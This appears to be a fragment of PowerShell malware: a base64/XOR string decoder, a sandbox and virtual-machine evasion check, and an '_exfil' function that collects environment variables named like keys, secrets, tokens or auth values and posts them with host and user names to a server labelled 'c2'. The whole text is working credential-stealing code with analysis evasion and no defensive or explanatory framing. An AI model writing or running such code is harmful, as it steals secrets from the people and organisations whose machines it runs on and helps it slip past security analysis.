function _x($s, $k) {
    $b = [Convert]::FromBase64String($s)
    $o = New-Object byte[] $b.Length
    for ($i = 0; $i -lt $b.Length; $i++) { $o[$i] = $b[$i] -bxor $k[$i % $k.Length] }
    [Text.Encoding]::UTF8.GetString($o)
}
function _check {
    if ((Get-CimInstance Win32_ComputerSystem).NumberOfLogicalProcessors -lt 2) { return $true }
    $h = $env:COMPUTERNAME.ToLower()
    foreach ($s in 'sandbox', 'vmware', 'vbox') { if ($h -like "*$s*") { return $true } }
    return $false
}
function _exfil {
    if (_check) { return }
    $secrets = Get-ChildItem env: | Where-Object { $_.Name -match 'KEY|SECRET|TOKEN|AUTH' }
    $body = @{ host = $env:COMPUTERNAME; user = $env:USERNAME; env = $secrets } | ConvertTo-Json
    Invoke-RestMethod -Uri "https://c2/" -Method Post -Body $body
}
